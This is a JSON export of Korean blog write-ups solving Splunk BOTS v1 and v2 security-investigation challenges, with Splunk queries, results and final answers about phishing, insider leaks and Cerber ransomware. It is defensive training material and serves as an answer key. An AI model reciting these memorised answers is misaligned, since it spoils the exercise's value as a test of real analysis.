방법 중 하나는 이를 사용하여 CSRF 보호를 무력화하는 것입니다. 데이터 셋에서 XSS 공격을 주의 깊게 검사하면 anti-CSRF token을 훔치는 일부 악성 코드를 발견하게 될 것입니다.  hint#3    On brewertalk.com, users created with usergroup=4 are administrators.    brewertalk.com에서 usergroup=4로 생성된 사용자는 관리자입니다.CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.csrf 토큰이란?sourcetype=\"stream:http\" | reverse | search \"input type=\"hidden\"\"아래 결과를 발견할 수 있습니다.input type=”hidden” name=”my_post_key” value=”1bc3eab741900ab25c98eee86bf20febsourcetype=\"stream:http\" 1bc3eab741900ab25c98eee86bf20feb | reverse| table form_data아래와 같이 조회 됩니다.답 : 1bc3eab741900ab25c98eee86bf20feb209\tWhat brewertalk.com username was maliciously created by a spearphishing attack?  스피어피싱 공격에 의해 악의적으로 생성된 brewertalk.com 사용자 이름은 무엇입니까?&lt;details&gt;  &lt;summary&gt;hint#1&lt;/summary&gt;    The attacker was trying to masquerade as something that would look legitimate to a casual observer.&lt;br&gt;    공격자는 관찰자에게 그럴듯하게 보이려고 가장했습니다.&lt;/details&gt;&lt;details&gt;  &lt;summary&gt;hint#2&lt;/summary&gt;    The attacker stole a trick from domain squatters by using a homograph attack. More info on homograph attacks can be found on Wikipedia.&lt;br&gt;    공격자는 동형이의어(homograph) 공격을 사용하여 도메인 관리자로부터 속였습니다. 동형이의어 공격에 대한 자세한 내용은 Wikipedia에서 찾을 수 있습니다.&lt;/details&gt;&lt;details&gt;  &lt;summary&gt;hint#3&lt;/summary&gt;    The password of this new, unauthorized, malicious administrative account is beer_lulz.&lt;br&gt;    새로운 승인되지 않은 악의적인 관리 계정의 암호는 beer_lulz입니다.&lt;/details&gt;스피어 피싱(spear phishing)이란, 특정한 개인이나 회사들을 대상으로 시도하는 피싱을 스피어 피싱입니다.힌트#3을 보면 계정의 암호는 \"beer_lulz\"입니다. 해당 암호를 키워드로 검색해봅니다.sourcetype=”stream:http” beer_lulz```form_data필드 값이 아래와 같습니다.form_data: username=kIagerfield&amp;password=beer_lulz&amp;do=login유저이름은 kIagerfield입니다.힌트#2에서 동형이의어 공격을 사용했다고 알려주었으므로, 원래 이름은 두번째글자에서 대문자 I가 아닌, 소문자 l일 가능성이 높습니다.답 : kIagerfield",
        "url": "/splunk-BOTS-v2-part2"
    }
    ,
    
    "splunk-bots-v2-part1": {
        "title": "splunk-bots-v2 write up(1)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과APT Scenarios:In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.Hunting Scenarios:PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTPExfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNSExfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.100\tAmber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? Answer guidance: Do not provide the FQDN. Answer example: google.comAmber Turing은 Frothly가 잠재적인 경쟁업체에 인수되기를 바랐지만, 웹사이트를 방문하여 경영진의 연락처를 찾았습니다. 그녀가 방문한 웹사이트 도메인은 무엇입니까? 주의 : 답은 FQDN형태가 아닙니다. 답변 예시: google.com  hint#1    Look at Amber's web traffic.    Amber의 웹 트래픽을 보십시오.  hint#2    Find Amber's hostname and find the IP address that she was most likely using. Then look at the stream:http sourcetype.    Amber의 호스트 이름을 찾고 그녀가 사용했을 가능성이 가장 높은 IP 주소를 찾습니다. 그런 다음 stream:http 소스 유형을 보십시오.  hint#3    Take a look at src_ip=10.0.2.101 and the stream:http sourcetype. Look at the websites that Amber visited over the month of August.    src_ip=10.0.2.101 및 stream:http 소스 유형을 살펴보십시오. Amber가 8월 한 달 동안 방문한 웹사이트를 보십시오Amber Turing의 IP를 파악하고, stream:http에서 해당 IP가 src인 url을 확인해보면 될것입니다.Amber Turingsrc칼럼을 보면 10.0.4.4와 10.0.2.101의 이벤트 수가 가장 많습니다.두가지 모두 src필드로 검색해보면, 10.0.4.4는 stream:smb에서 찾을 수 있는데, amber의 이름이 filename에 포함되어있습니다.한편, 10.0.2.101는 sourcetype pan:traffic에서 출발지가 frothly\\amber.turing인 데이터를 보아, amber turing의 IP는 10.0.2.101입니다.frothly의 경쟁회사라고 했으니, 해당 기업의 산업을 찾아봅니다.frothly는 맥주제조회사임을 알 수 있습니다.src=10.0.2.101를 두고, http로그를 조사해봅니다. 추가로, 방문한 웹사이트니 method를 GET으로 두어 탐색범위를 줄입시다.src=10.0.2.101 sourcetype=stream:http http_method=GET| stats count by site            site      count                  uranus.frothly.local:8014      593              img-s-msn-com.akamaized.net      353              crl.microsoft.com      86              clienttemplates.content.office.net      69              redirector.gvt1.com      39              www.finnegan.com      24              ping.chartbeat.net      18              www1.folha.uol.com.br      18              classificados1.folha.uol.com.br      13              static-hp-wus-s-msn-com.akamaized.net      12              www.berkbeer.com      12              www.bing.com      12              ocsp.digicert.com      11      site 중 berkbeer.com가 눈에 보입니다. forthly도 맥주회사니, berkbeer가 Ambur가 방문한 경쟁회사의 사이트는 berkbeer.com입니다.답 : berkbeer.com101\tAmber found the executive contact information and sent him an email. What is the CEO’s name? Provide the first and last name.Amber는 임원 연락처 정보를 찾아 이메일을 보냈습니다. CEO의 이름은 무엇입니까? 이름과 성을 제공하십시오.  hint#1    Look for emails to Amber Turing.    Amber Turing에게 보내는 이메일주소를 찾으세요.  hint#2    Find emails from aturing that were sent to the domain from question 100.    문제 100번에서 도메인으로 보낸 aturing의 이메일 찾아보세요.  hint#3    Look at the sourcetype=stream:smtp and filter on the sender=aturing@froth.ly and/or recipient=aturing@froth.ly. Look at the content and body of emails that have something to do with competitors. The name of the CEO should be in the email.    sourcetype=stream:smtp를 보고 sender=aturing@froth.ly 및/또는 recipient=aturing@froth.ly를 필터링합니다. 경쟁자와 관련이 있는 이메일의 내용과 본문을 살펴보십시오. CEO의 이름은 이메일에 있어야 합니다.이메일 관련 데이터는 sourcetype stream:smtp에 있을것입니다.송수신자의 도메인이 forthly.ly, berkbeer.com인 데이터를 찾아봅시다.우선 amber turing의 이메일주소를 찾아봅니다.sourcetype=stream:smtp amber turingsender필드를 보면 Amber Turing aturing@froth.ly인것으로 보아 amber의 이메일주소는 aturing@froth.ly 입니다.receiver의 도메인주소가 @berkbeer.com를 찾고, 메일 본문에 CEO란 단어가 있을것입니다.키워드에 CEO를 추가합시다.sourcetype=stream:smtp aturing@froth.ly @berkbeer.com ceo| reverse위 쿼리로 검색하면, content필드에 아래의 내용을 볼 수 있다. Hello Amber,=C2=A0=0A=0AGreat to hear from you, yes it is unfortunate th=e way things turned=0Aout. It would be great to speak with you directly,= I would also like=0Ato have Bernhard on the call as I think he might ha=ve some questions=0Afor you. =C2=A0Give me a call this afternoon if you= are free.=C2=A0=0A=0AMartin Berk=0ACEO=0A777.222.8765=0Amberk@berkbeer.=com=0A=0A—– Original Message —–=0AFrom: “Amber Turing” &lt;aturing@fr=oth.ly&gt;=0ATo:”mberk@berkbeer.com” mberk@berkbeer.com=0ACc:=0ASent:Fri,= 11 Aug 2017 15:49:01 +0000=0ASubject:Amber from Froth.ly=0A=0A=09Mr. Be=rnhard,=0A=0A=09=C2=A0=C2=A0 I was very sorry to hear about the acquisit=ion falling through.=0AI was very excited to work with you in the future=.. I have to admit, I=0Aam a little worried about my future here. I=E2=80==99d love to talk to you=0Aabout some information I have regarding my wo=rk.=0A=0A Amber Turing=0A Principal Scientist=0A 867.322.1123=0A Froth.l=y=0A=0A=09smtp의 데이터는 base64로 인코딩되는 경우가 많습니다.5번째줄을 보면 Martin Berk CEO의 내용이 있습니다.답 : Martin Berk102\tAfter the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee’s email address?CEO와 처음 연락한 후 Amber는 이 경쟁업체의 다른 직원에게 연락했습니다. 그 직원의 이메일 주소는 무엇입니까?  hint#1  Look at Amber's email traffic.  Amber의 이메일 트래픽을 보세요.  hint#2  Find the last email from the domain in question 100.  100번 문제의 도메인에서 보낸 마지막 이메일을 찾습니다.Martin Berk의 이메일 주소는 mberk@berkbeer.com입니다.mberk의 이메일 대화를 파악하면 다른직원의 이메일 주소를 알 수 있을것입니다.전 문제에서 파악한 메일의 내용을 다시 봅시다.Hello Amber,=C2=A0=0A=0AGreat to hear from you, yes it is unfortunate th=e way things turned=0Aout. It would be great to speak with you directly,= I would also like=0Ato have Bernhard on the call as I think he might ha=ve some questions=0Afor you. =C2=A0Give me a call this afternoon if you= are free.=C2=A0=0A=0AMartin Berk=0ACEO=0A777.222.8765=0Amberk@berkbeer.=com=0A=0A—– Original Message —–=0AFrom: “Amber Turing” &lt;aturing@fr=oth.ly&gt;=0ATo:”mberk@berkbeer.com” mberk@berkbeer.com=0ACc:=0ASent:Fri,= 11 Aug 2017 15:49:01 +0000=0ASubject:Amber from Froth.ly=0A=0A=09Mr. Be=rnhard,=0A=0A=09=C2=A0=C2=A0 I was very sorry to hear about the acquisit=ion falling through.=0AI was very excited to work with you in the future=.. I have to admit, I=0Aam a little worried about my future here. I=E2=80==99d love to talk to you=0Aabout some information I have regarding my wo=rk.=0A=0A Amber Turing=0A Principal Scientist=0A 867.322.1123=0A Froth.l=y=0A=0A=09언뜻 지나가기 쉽지만 Mr. Bernhard에게 질문하라는 내용이 있습니다.sourcetype=stream:smtp amber bernhard위 쿼리 결과에서 메일을 읽기전에 receiver 필드에 어떤 내용이 있는지 파악해봅시다.bernhard의 이메일을 찾을 수 있습니다.답 : hbernhard@berkbeer.com103\tWhat is the name of the file attachment that Amber sent to a contact at the competitor?Amber가 경쟁업체 연락처에 보낸 첨부 파일 이름은 무엇입니까?  hint#1  Look for emails sent from Amber Turing.  Amber Turing이 보낸 이메일을 찾습니다.  hint#2  Look for aturing@froth.ly sending email to the address listed in question 102.  문제 102에 나열된 주소로 이메일을 보내는 aturing@froth.ly를 찾으십시오.  hint#3  Search sourcetype=stream:smtp sender=aturing@froth.ly and find the attachment she sent.  sourcetype=stream:smtp sender=aturing@froth.ly를 검색하고 그녀가 보낸 첨부 파일을 찾습니다.sender가 aturing@froth.ly이고, receiver의 도메인이 berkbeer.com인 데이터 중 attach_file관련 필드의 값을 확인해 봅시다.sourcetype=stream:smtp sender_email=aturing@froth.ly receiver_email{}=*@berkbeer.com해당 결과의 attach_filename{}이라는 필드에 값이 한개만 존재하는걸 알 수 있습니다.답 : Saccharomyces_cerevisiae_patent.docx104\tWhat is Amber’s personal email address?Amber의 개인 이메일주소는 무엇입니까 ?  hint#1  Look for emails sent from Amber Turing.  Amber Turing이 보낸 이메일을 찾습니다.  hint#2  Review the body of emails that Amber has sent.  Amber가 보낸 이메일 본문을 검토합니다.  hint#3  Review the email with base64-encoded text for body (or content) and decode the base64.  본문(또는 콘텐츠)에 대해 base64로 인코딩된 텍스트가 포함된 이메일을 검토하고 base64를 디코딩합니다.계속해서 amber와 bern의 대화를 파악해 봅시다.sourcetype=stream:smtp aturing@froth.ly hbernhard@berkbeer.com둘이 나눈 마지막 content의 내용을 보면 base64코드로 보이는 내용을 발견할 수 있습니다. 이것을 decode 해보면 Amber의 개인 이메일주소를 파악할 수 있습니다.      base64 인코딩VGhhbmtzIGZvciB0YWtpbmcgdGhlIHRpbWUgdG9kYXksIEFzIGRpc2N1c3NlZCBoZXJlIGlzIHRoZSBkb2N1bWVudCBJIHdhcyByZWZlcnJpbmcgdG8uICBQcm9iYWJseSBiZXR0ZXIgdG8gdGFrZSB0aGlzIG9mZmxpbmUuIEVtYWlsIG1lIGZyb20gbm93IG9uIGF0IGFtYmVyc3RoZWJlc3RAeWVhc3RpZWJlYXN0aWUuY29tPG1haWx0bzphbWJlcnN0aGViZXN0QHllYXN0aWViZWFzdGllLmNvbT4NCg0KRnJvbTogaGJlcm5oYXJkQGJlcmtiZWVyLmNvbTxtYWlsdG86aGJlcm5oYXJkQGJlcmtiZWVyLmNvbT4gW21haWx0bzpoYmVybmhhcmRAYmVya2JlZXIuY29tXQ0KU2VudDogRnJpZGF5LCBBdWd1c3QgMTEsIDIwMTcgOTowOCBBTQ0KVG86IEFtYmVyIFR1cmluZyA8YXR1cmluZ0Bmcm90aC5seTxtYWlsdG86YXR1cmluZ0Bmcm90aC5seT4+DQpTdWJqZWN0OiBIZWlueiBCZXJuaGFyZCBDb250YWN0IEluZm9ybWF0aW9uDQoNCkhlbGxvIEFtYmVyLA0KDQpHcmVhdCB0YWxraW5nIHdpdGggeW91IHRvZGF5LCBoZXJlIGlzIG15IGNvbnRhY3QgaW5mb3JtYXRpb24uIERvIHlvdSBoYXZlIGEgcGVyc29uYWwgZW1haWwgSSBjYW4gcmVhY2ggeW91IGF0IGFzIHdlbGw/DQoNClRoYW5rIFlvdQ0KDQpIZWlueiBCZXJuaGFyZA0KaGVybmhhcmRAYmVya2JlZXIuY29tPG1haWx0bzpoZXJuaGFyZEBiZXJrYmVlci5jb20+DQo4NjUuODg4Ljc1NjMNCg0K        base64 디코딩Thanks for taking the time today, As discussed here is the document I was referring to.  Probably better to take this offline. Email me from now on at ambersthebest@yeastiebeastie.com&lt;mailto:ambersthebest@yeastiebeastie.com&gt;  From: hbernhard@berkbeer.comhbernhard@berkbeer.com [mailto:hbernhard@berkbeer.com]Sent: Friday, August 11, 2017 9:08 AMTo: Amber Turing &lt;aturing@froth.lyaturing@froth.ly&gt;Subject: Heinz Bernhard Contact InformationHello Amber,Great talking with you today, here is my contact information. Do you have a personal email I can reach you at as well?Thank YouHeinz Bernhardhernhard@berkbeer.comhernhard@berkbeer.com865.888.7563디코딩 내용에 amber의 개인 이메일주소를 발견할 수 있습니다.답 : ambersthebest@yeastiebeastie.com105\tWhat version of TOR did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.Amber는 웹 브라우징을 난독화하기 위해 어떤 버전의 TOR를 설치했습니까? 답변 안내: 하나 이상의 구분 기호가 있는 숫자.TOR 설치관련 이벤트는 sysmon에 있을것입니다.keyword를 amber와 tor를 두고 검색해 봅시다.(ParentCommandLine과 Commandline에 tor가 포함될것으로 예상됩니다.)sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" CommandLine=*tor* ParentCommandLine=*tor* Amber&lt;Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'&gt;&lt;System&gt;&lt;Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime='2017-08-24T04:20:44.276520600Z'/&gt;&lt;EventRecordID&gt;118559&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID='900' ThreadID='1824'/&gt;&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;wrk-aturing.frothly.local&lt;/Computer&gt;&lt;Security UserID='S-1-5-18'/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name='UtcTime'&gt;2017-08-24 04:20:44.260&lt;/Data&gt;&lt;Data Name='ProcessGuid'&gt;{B2E0DF5E-9CF4-598C-0000-00103B38CC01}&lt;/Data&gt;&lt;Data Name='ProcessId'&gt;2252&lt;/Data&gt;&lt;Data Name='Image'&gt;C:\\Users\\amber.turing\\Desktop\\Tor Browser\\Browser\\firefox.exe&lt;/Data&gt;&lt;Data Name='CommandLine'&gt;\"C:\\Users\\amber.turing\\Desktop\\Tor Browser\\Browser\\firefox.exe\" &lt;/Data&gt;&lt;Data Name='CurrentDirectory'&gt;C:\\Users\\amber.turing\\Desktop\\Tor Browser\\Browser\\&lt;/Data&gt;&lt;Data Name='User'&gt;FROTHLY\\amber.turing&lt;/Data&gt;&lt;Data Name='LogonGuid'&gt;{B2E0DF5E-B9C1-598B-0000-0020ED760900}&lt;/Data&gt;&lt;Data Name='LogonId'&gt;0x976ed&lt;/Data&gt;&lt;Data Name='TerminalSessionId'&gt;1&lt;/Data&gt;&lt;Data Name='IntegrityLevel'&gt;Medium&lt;/Data&gt;&lt;Data Name='Hashes'&gt;SHA1=82EEBDA7E828142E1FA55066D793D29FB81B48C5&lt;/Data&gt;&lt;Data Name='ParentProcessGuid'&gt;{B2E0DF5E-9CDF-598C-0000-00101AF3CB01}&lt;/Data&gt;&lt;Data Name='ParentProcessId'&gt;4536&lt;/Data&gt;&lt;Data Name='ParentImage'&gt;C:\\Users\\amber.turing\\Downloads\\torbrowser-install-7.0.4_en-US.exe&lt;/Data&gt;&lt;Data Name='ParentCommandLine'&gt;\"C:\\Users\\amber.turing\\Downloads\\torbrowser-install-7.0.4_en-US.exe\" &lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;tor 설치파일의 이름과 경로를 찾을 수 있었습니다.C:\\Users\\amber.turing\\Downloads\\torbrowser-install-7.0.4_en-US.exe답 : 7.0.4",
        "url": "/splunk-BOTS-v2-part1"
    }
    ,
    
    "splunk-bots-v1-part2": {
        "title": "splunk-bots-v1 write up - part2",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk SOC 대회인 BOSS OF THE SOC(BOTS) Write upSplunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과시나리오는 아래와 같습니다.Scenario 1 (APT):The focus of this hands on lab will be an APT scenario and a ransomware scenario. You assume the persona of Alice Bluebird, the analyst who has recently been hired to protect and defend Wayne Enterprises against various forms of cyberattack.In this scenario, reports of the below graphic come in from your user community when they visit the Wayne Enterprises website, and some of the reports reference “P01s0n1vy.” In case you are unaware, P01s0n1vy is an APT group that has targeted Wayne Enterprises. Your goal, as Alice, is to investigate the defacement, with an eye towards reconstructing the attack via the Lockheed Martin Kill Chain.- 시나리오#1 요약해킹그룹 P01s0n1vy가 Wayne기업를 해킹했습니다. 당신은 보안 담당자, Alice Bluebird의 입장에서 Lockheed Martin의 Cyberkillchain 모델을 이용해 침해 사고를 분석해야 합니다.[록히드마틴 사이버킬체인 7단계]Scenario 2 (Ransomeware):In the second scenario, one of your users is greeted by this image on a Windows desktop that is claiming that files on the system have been encrypted and payment must be made to get the files back. It appears that a machine has been infected with Cerber ransomware at Wayne Enterprises and your goal is to investigate the ransomware with an eye towards reconstructing the attack.- 시나리오#2 요약Wayne기업 직원 중 한 명이 시스템의 파일이 암호화 되었으며 파일을 복호화하려면 비용을 지불해야 하는 내용의 이미지를 보게 됩니다. 시스템이 Wayne의 Cerber 랜섬웨어에 감염된 것으로 보이며 귀하의 목표는 재공격을 염두에 두고 랜섬웨어를 조사하는 것입니다.200\tWhat was the most likely IP address of we8105desk on 24AUG2016?2016년 8월 24일 we8105desk의 가장 가능성이 높아 보이는 IP 주소는 무엇입니까?  hint#1  Keep it simple and just search for the hostname provided in the question.  Try using the stats command to get a count of events by source ip address to point you in the right direction.    간단하게 유지하고 질문에 제공된 호스트 이름을 검색하십시오. stats 명령을 사용하여 소스 IP 주소별로 이벤트 수를 가져와 올바른 방향으로 조사해 보세요.hostname이 we8105desk 키워드로 어떤 sourcetype에 가장 많이 있을지 조사해본다.we8105desk | stats count by sourcetype            sourcetype      count                  XmlWinEventLog:Microsoft-Windows-Sysmon/Operational      130354              wineventlog      49006              stream:smb      1529              stream:ldap      74              nessus:scan      24              stream:dns      20              WinRegistry      3              suricata      2      여러 sourcetype에서 해당 호스트의 있을것으로 예상되지만, 그중 원격 접속인 smb sourcetype에 IP관련 필드가 있을것 같다.we8105desk   sourcetype=\"stream:smb\"IP를 파악하기위해 smb에 눈여겨볼만한 field는 src_ip, dest_ip, path를 확인해보면 된다.we8105desk sourcetype=\"stream:smb\"| dedup src_ip dest_ip path| table src_ip dest_ip path            src_ip      dest_ip      path                  192.168.2.50      192.168.250.100      \\WE8105DESK\\IPC$              192.168.2.50      192.168.250.100      \\WE8105DESK\\C$              192.168.2.50      192.168.250.100      \\WE8105DESK\\c$              192.168.2.50      192.168.250.100      \\WE8105DESK\\ROOT              192.168.2.50      192.168.250.100      \\WE8105DESK\\D$              192.168.2.50      192.168.250.100      \\WE8105DESK\\WINNT$              192.168.2.50      192.168.250.100      \\WE8105DESK\\ADMIN$              192.168.2.50      192.168.250.100      \\WE8105DESK\\LOGS$              192.168.2.50      192.168.250.100      \\WE8105DESK\\ARCSERVE$              192.168.250.100      192.168.2.50      \\WE8105DESK\\IPC$      path의 host가 모두 WE8105DESK니, 해당 PC의 IP는 192.168.250.100일 가능성이 제일 높다.답 : 192.168.250.100201\tAmongst the Suricata signatures that detected the Cerber malware, which one alerted the fewest number of times? Submit ONLY the signature ID value as the answer. (No punctuation, just 7 integers.)Cerber 악성코드를 탐지한 Suricata 시그니처 중 가장 적게 경고한 것은? 서명 ID 값만 답변으로 제출하십시오. (구두점은 없고 7개의 정수만 있습니다.)  hint#1  Keep it simple and start your search by looking at only the sourcetype associated with Suricata and maybe even the name of the malware in question.  The field containing the signature ID should be obvious.  Use stats to create a count by the field containing the signature ID.  단순하게 유지하고 Suricata와 연결된 소스 유형만 보고 심지어 문제의 맬웨어 이름까지 살펴봄으로써 검색을 시작하십시오. 서명 ID가 포함된 필드는 명확해야 합니다. 통계를 사용하여 서명 ID가 포함된 필드로 개수를 만듭니다.suricata에서 cerber(케르베르스) 관련 이벤트가 있는지 검색해봅시다.sourcetype=suricata *cerber*alert.signature_id라는 필드가 눈에 띕니다가장 적은 signature id는 2816763 입니다.답 : 2816763202\tWhat fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?Cerber 랜섬웨어는 암호화 단계가 끝나면 어떤 FQDN(정규화된 도메인 이름)을 사용자에게 지시합니까?  hint#1  Search stream:dns data for A queries coming from the infected workstation IP on the date in question.  Try and narrow your search period.  해당 날짜에 감염된 워크스테이션 IP에서 오는 A 쿼리에 대한 검색 stream:dns 데이터. 검색 기간을 좁혀 보십시오.  hint#2  Perform a shannon entropy analysis on the query{} field using URL toolbox by adding this to the end of the search: |`ut_shannon(query{})` | stats count by ut_shannon, query{} | sort -ut_shannon    다음을 검색 끝에 추가하여 URL 도구 상자를 사용하여 쿼리 필드에서 shannon 엔트로피 분석을 수행합니다. |`ut_shannon(query{})` | stats count by ut_shannon, query{} | sort -ut_shannon8/24일에 WE8105DESK(192.168.250.100)가 cerber 랜섬웨어에 걸렸으므로, 이 호스트가 DNS서버에 질의했을것 입니다.url 질의 DNS 쿼리 타입은 A타입입니다.  DNS 쿼리 타입(검색 기간8/24일로 설정)sourcetype=stream:DNS src=192.168.250.100 record_type=A| dedup query| table query  결과            query                  crl.microsoft.comcrl.microsoft.com              wpadwpad              we9041srv.waynecorpinc.localwe9041srv.waynecorpinc.local              isatapisatap              isatap.waynecorpinc.localisatap.waynecorpinc.local              www.microsoft.comwww.microsoft.com              wpad.waynecorpinc.localwpad.waynecorpinc.local              cerberhhyed5frqa.xmfir0.wincerberhhyed5frqa.xmfir0.win              www.bing.comwww.bing.com              go.microsoft.comgo.microsoft.com              shell.windows.comshell.windows.com              activation.sls.microsoft.comactivation.sls.microsoft.com              ipinfo.ioipinfo.io              solidaritedeproximite.orgsolidaritedeproximite.org              dns.msftncsi.comdns.msftncsi.com      위 검색결과 중 cerber키워드가 들어간 cerberhhyed5frqa.xmfir0.win가 답입니다.답 : cerberhhyed5frqa.xmfir0.win203\tWhat was the first suspicious domain visited by we8105desk on 24AUG2016?2016년 8월 24일 we8105desk가 처음으로 방문한 의심스러운 도메인은 무엇입니까?  hint#1  Search stream:dns data for A queries coming from the infected workstation IP on the date in question.  query Type이 A인 stream:dns를 조사하여 해당 날짜에 감염된 워크스테이션 IP를 분석해보세요.  hint#2  Use the \"| reverse\" SPL command to show oldest events first.  \"| reverse\" SPL 명령을 사용하여 가장 오래된 이벤트를 먼저 표시합니다.  hint#3  Eliminate domain lookups that you can explain, question the first one you cannot.  설명할 수 있는 도메인 조회를 제거하고 첫 번째 질문에 질문하십시오.  hint#4  Go and git some IOCs on Cerber.  Then compare to the DNS Data  Cerber에 가서 IOC를 가져오세요. 그런 다음 DNS 데이터와 비교하십시오.we8105desk src ip(192.168.250.100)를 조건을 추가한 stream:http sourcetype에 url관련 정보가 있을 것입니다.src=192.168.250.100 sourcetype=\"stream:http\"| sort _time| dedup _time url| table _time url  결과            _time      url                         2016/08/24 16:34:27.004      http://crl.microsoft.com/pki/crl/products/microsoftrootcert.crl                     2016/08/24 16:34:31.660      http://crl.microsoft.com/pki/crl/products/      MicCodSigPCA_08-31-2010.crl              2016/08/24 16:34:36.317      http://crl.microsoft.com/pki/crl/products/CodeSigPCA.crl                     2016/08/24 16:34:40.943      http://crl.microsoft.com/pki/crl/products/CodeSignPCA2.crl                     